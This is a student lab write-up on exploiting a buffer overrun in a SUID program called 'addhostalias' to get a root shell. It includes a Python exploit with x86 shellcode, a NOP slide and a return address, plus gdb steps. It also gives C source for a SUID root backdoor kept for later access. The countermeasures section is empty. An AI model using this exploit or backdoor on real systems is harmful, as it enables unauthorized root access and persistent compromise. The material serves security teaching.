# Language-based Security

## Lab 2 - Buffer Overruns

### Part 1 : Gaining root access

In order to gain root access to this machine, we are going to use the `addhostalias` executable file, which seems to be vulnerable to buffer overruns. In order to exploit this, we are going to go through several steps :
- analyse the vulnerability in the code.
- use gdb to debug and analyse how the program behaves.
- find a way to exploit it, in our case we will use Python which allows us to gain a root shell more easily. Since it is a high level language, we can focus on the content of our malicious code instead of how to generate it.


First of all, let's have a brief explanation of how the stack works in this type of program. In order to maintain consistency during program execution, Linux OS stores everything that is necessary for the program to work in memory. This means it can push data in a stack, but also store addresses that point to other memory locations(for example when a function call is performed). The schema below tries to summarize the memory layout:

```
       0xffffffff

   4 bytes (32bits OS)
< --------------------->


 ----------------------
|   RETURN ADDRESS      | 
 ----------------------
|    BASE POINTER      |
 ---------------------- 
|                      |
|                      |
|                      |
|                      |
|                      |
|       STACK          |
|    (256 bytes)       |
|                      |
|                      |
|                      |
 ----------------------

       0x00000000

```

Then, our goal is to inject inside the buffer the 256 bytes necessary to fully occupy it + 8 bytes to overwrite the base pointer and the return address.

```python
# run a shell on local machine
shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
             +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
             +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
             +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
             +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
             +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
             +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')


# NOP signal, tells the CPU to go to the next instruction
nop = '\x90'
nops = nop*181

# estimated area of the end of the stack
nop_adress = '\x10\xf9\xff\xbf'

# 181 (NOPs) + 75 (Shellcode) + 2 (separators between addhostalias arguments) + 2 (last 2 bytes for base pointer occupied by 2 NOPs)+ 4 (return address) = 264 bytes of data (instead of 256, so it will overwrite the base pointer and the return address)
print nops+shellcode,nop*2,nop_adress


```

![How to use GDB to craft our exploit](/assets/lab2/gdb-demo.png)
![Steps of our buffer overflow](/assets/lab2/buffer-overflow.png)


```

 ----------------------
|   RETURN ADDRESS      | <------- now redirects approximately to the end of the stack (in the NOP slide inserted inside the buffer)
 ----------------------
|    BASE POINTER      | <------- not important in our case, but it is now overwritten
 ---------------------- 
|                      |
|       MALICIOUS      |
|         CODE         |
|                      |
|         ...          |
|         NOP          |
|         NOP          |
|         NOP          |
 ----------------------

```

The SUID bit is set so the program is vulnerable

`addhostalias $(python gainr00t.py)`

Allows to gain root access using our python script

`gdb --args addhostalias $(python -c 'print "\x41"*200') ttt ttt`

Allows to enter debugging mode

`(gdb) break fopen`

Avoid having a permission denied. If we don't do that, an error will occur during debugging.

`(gdb) run`

`(gdb) x/100x $sp`

This command displayed 100 words in our memory and allows to see patterns.

The suid bit configured on `addhostalias` gives us the opportunity to execute the commands described in the shellcode with the necessary root permissions. These instructions allow us to launch a root shell after the execution of the program. If we didn't set the real used id and the real group id as the effective user id (root) during the execution of the program, we would lose our root permissions before entering the called shell and have access to a normal user's shell instead. 


### Part 2 : Create a Backdoor

Once we have access to a root shell, we need to create a backdoor in order to be able to log as root easily the next time we need to.
To do that, all we need is to create a c file called `backdoor.c`for exemple:

```c 
#include<stdlib.h>
main () {
setuid(0);
system("/bin/bash");
}
```

Then we need to compile it with gcc: `gcc -o backdoor backdoor.c`.
Finally, we have to set the suid bit: `chmod u+s backdoor` and verify that group and others have the execute permission.

Now, when we execute`./backdoor` with the user dvader, we gain access to a root shell.

### Part 3 : Countermeasures

- Canaries : ...
- NX bit : ...
- ASLR : ...


### Sources that helped us gaining root access on the machine

1. [Buffer Overflow Attack, Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=589s)
2. [GDB Petit Tutoriel, Daniel Hirschkof](http://perso.ens-lyon.fr/daniel.hirschkoff/C_Caml/docs/doc_gdb.pdf)
3. [Le Débogueur GDB, Anne Canteaut](https://www.rocq.inria.fr/secret/Anne.Canteaut/COURS_C/gdb.html)






